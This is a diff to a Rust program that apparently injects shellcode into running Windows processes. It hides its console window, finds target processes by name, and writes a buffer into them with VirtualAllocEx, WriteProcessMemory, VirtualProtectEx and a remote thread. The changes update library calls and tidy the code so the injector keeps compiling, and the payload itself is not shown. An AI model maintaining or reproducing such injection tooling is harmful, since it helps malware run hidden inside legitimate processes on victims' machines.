@@ -1,7 +1,8 @@
 #![windows_subsystem = "windows"]
 #![allow(non_snake_case)]
 
-use sysinfo::{PidExt, ProcessExt, System, SystemExt};
+use sysinfo::System;
+use std::ffi::OsStr;
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows::Win32::System::Memory::VirtualAllocEx;
 use windows::Win32::System::Memory::VirtualProtectEx;
@@ -21,11 +22,11 @@ fn boxboxbox(tar: &str) -> Vec<usize> {
     // search for processes to inject into
     let mut dom: Vec<usize> = Vec::new();
     let s = System::new_all();
-    for pro in s.processes_by_exact_name(tar) {
+    for pro in s.processes_by_exact_name(OsStr::new(tar)) {
         //println!("{} {}", pro.pid(), pro.name());
         dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
     }
-    return dom;
+    dom
 }
 
 fn enhance(buf: Vec<u8>, tar: usize) {
@@ -54,7 +55,7 @@ fn enhance(buf: Vec<u8>, tar: usize) {
             h_process,
             None,
             0,
-            Some(std::mem::transmute(result_ptr)),
+            Some(std::mem::transmute::<*mut std::ffi::c_void, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>(result_ptr)),
             None,
             0,
             None,
@@ -87,7 +88,7 @@ fn main() {
         vec.push(*i);
     }
     let list: Vec<usize> = boxboxbox(tar);
-    if list.len() == 0 {
+    if list.is_empty() {
         panic!("[-] Unable to find a process.")
     } else {
         for i in &list {
